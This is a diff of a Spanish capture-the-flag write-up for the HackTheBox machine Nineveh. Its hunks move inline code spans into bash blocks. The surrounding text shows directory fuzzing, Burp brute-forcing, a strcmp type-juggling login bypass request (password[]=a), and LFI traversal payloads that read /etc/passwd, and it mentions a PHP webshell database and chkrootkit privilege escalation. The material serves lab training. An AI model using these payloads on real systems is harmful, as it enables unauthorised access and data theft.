@@ -79,7 +79,11 @@ siempre es interesante mirar lo que hay en el certificado
 openssl s_client -connect 10.10.10.43:443
 ```
 
-vemos una direccion de correo `admin@nineveh.htb` lo que quiere decir que tenemos un usuario y un dominio. 
+vemos una direccion de correo 
+```bash
+ admin@nineveh.htb 
+```
+ lo que quiere decir que tenemos un usuario y un dominio. 
 Como no tenemos mucha mas informacion, vamos a fuzzear la web.
 
 #### Fuzzing con WFuzz {-}
@@ -90,7 +94,11 @@ Fuzzeamos el puerto 80
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.43/FUZZ
 ```
 
-Encontramos una ruta `/department`.
+Encontramos una ruta 
+```bash
+ /department 
+```
+.
 
 y tambien el puerto 443
 
@@ -99,17 +107,29 @@ y tambien el puerto 443
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.43/FUZZ
 ```
 
-Encontramos una ruta `/db`.
+Encontramos una ruta 
+```bash
+ /db 
+```
+.
 
 #### Analizamos el directorio department de puerto 80 {-}
 
 Aqui vemos una pagina de Login. El wappalizer no nos muestra algo nuevo. Poniendo como nombre de usuario **admin**, la web
-nos señala un mensaje `invalid password` lo que quiere decir que el usuario existe. Vamos a utilizar fuzzing con **BurpSuite**
+nos señala un mensaje 
+```bash
+ invalid password 
+```
+ lo que quiere decir que el usuario existe. Vamos a utilizar fuzzing con **BurpSuite**
 para encontrar la contraseña del usuario admin.
 
 #### Analizamos el directorio db de puerto 443 {-}
 
-Aqui vemos una pagina de Login para un servicio `phpLiteAdmin` de version **1.9**. Buscamos en internet si hay un default password para este servicio y
+Aqui vemos una pagina de Login para un servicio 
+```bash
+ phpLiteAdmin 
+```
+ de version **1.9**. Buscamos en internet si hay un default password para este servicio y
 efectivamente el default password del servicio es **admin** pero en este caso no funciona.
 
 
@@ -130,7 +150,11 @@ es exactamente la misma, solo la IP y la url de las imagenes cambian.
 1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.43
 1. En firefox le ponemos el foxyproxy para el burpsuite
 1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
-1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
+1. En burpsuite le damos al 
+```bash
+ Ctrl+i 
+```
+ para enviarlo al intruder
 1. Configuramos el attacker **Sniper** dando la posicion a la palabra password
 
 
@@ -221,9 +245,17 @@ if(isset($_POST['username'] == $USER){
 }
 ```
 
-El problema aqui es que usado el comando `strcmp()` para el password permite al atacante de burlar esto con un cambio de tipo.
+El problema aqui es que usado el comando 
+```bash
+ strcmp() 
+```
+ para el password permite al atacante de burlar esto con un cambio de tipo.
 
-Si la request normal es como la siguiente y nos pone `incorrect password`
+Si la request normal es como la siguiente y nos pone 
+```bash
+ incorrect password 
+```
+
 
 ```bash
 POST /login.php HTTP/1.1
@@ -245,7 +277,15 @@ Cookie: PHPSESSID=o36osnz71uw900ln395jhs
 username=admin&password[]=a
 ```
 
-El symbolo `[]` cambia el tipo de variable y el `strcmp()` lo acepta. 
+El symbolo 
+```bash
+ [] 
+```
+ cambia el tipo de variable y el 
+```bash
+ strcmp() 
+```
+ lo acepta. 
 
 ### Ataque de tipo intruder con burpsuite para el panel en el puerto 443 {-}
 
@@ -313,7 +353,11 @@ if __name__ == '__main__':
 ### Analizamos el panel de administracion del puerto 80 {-}
 
 Aqui vemos un link llamado Notes, pinchamos y se ve una nota. 
-Nos llama la atencion la url `10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`
+Nos llama la atencion la url 
+```bash
+ 10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt 
+```
+
 Intentamos ver si es vulnerable a un **LFI**
 
 ```bash
@@ -321,7 +365,11 @@ Intentamos ver si es vulnerable a un **LFI**
 10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd%00
 ```
 
-Aqui nos pone la pagina un mensaje `No notes selected`. Probamos mas cosas.
+Aqui nos pone la pagina un mensaje 
+```bash
+ No notes selected 
+```
+. Probamos mas cosas.
 
 ```bash
 10.10.10.43/department/manage.php?notes=files/ninevehNotes
@@ -337,7 +385,11 @@ La differentes respuestas nos hacen pensar que hay un systema de White words lis
 10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
 ```
 
-Ya podemos ver el contenido del `/etc/passwd` y vemos un usuario **amrois**
+Ya podemos ver el contenido del 
+```bash
+ /etc/passwd 
+```
+ y vemos un usuario **amrois**
 
 Miramos mas contenidos interresantes
 
@@ -411,7 +463,11 @@ crear una base de datos con una extension php y insertar PHP code para posterior
     knitr::include_graphics("images/phpliteadmin-hack-php.png")
     ```
 
-    Si pinchamos el link de la hack.php database vemos que a sido creado en `/var/tmp/hack.php`
+    Si pinchamos el link de la hack.php database vemos que a sido creado en 
+```bash
+ /var/tmp/hack.php 
+```
+
 
     knitr::include_graphics("images/phpliteadmin-create-table.png")
 ![hliteadmi-hack-h](/assets/images/phpliteadmin-hack-php.png) 
@@ -482,8 +538,24 @@ cd ..
 ls
 ```
 
-Aqui vemos que hay un directorio llamado `ssl` que contiene otro directorio `secure_notes` y como todo esto esta en `/var/www/html`
-miramos en firefox lo que es. `https://10.10.10.43/secure_notes` y vemos una imagen. Como el directorio se llama secure_notes, pensamos 
+Aqui vemos que hay un directorio llamado 
+```bash
+ ssl 
+```
+ que contiene otro directorio 
+```bash
+ secure_notes 
+```
+ y como todo esto esta en 
+```bash
+ /var/www/html 
+```
+
+miramos en firefox lo que es. 
+```bash
+ https://10.10.10.43/secure_notes 
+```
+ y vemos una imagen. Como el directorio se llama secure_notes, pensamos 
 directamente en steganografia y nos descargamos la image
 
 ### Analizando los bits menos significativos de la imagen {-}
@@ -514,7 +586,11 @@ Ya estamos conectados como amrois y podemos leer la flag.
 ### Otra manera de conectarnos a la maquina {-}
 
 Si durante el analisis del sistema hubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad
-`knockd` estava lanzada.
+
+```bash
+ knockd 
+```
+ estava lanzada.
 
 **Knockd** es una utilidad para escuchar o lanzar Port Knocking.
 
@@ -580,7 +656,11 @@ chmod +x pspy
 ./pspy
 ```
 
-Esperamos un poco y vemos que hay un script `/usr/bin/chkrootkit` que se ejecuta a interval regular de tiempo.
+Esperamos un poco y vemos que hay un script 
+```bash
+ /usr/bin/chkrootkit 
+```
+ que se ejecuta a interval regular de tiempo.
 
 #### Priviledge escalation con chkrootkit {-}
 
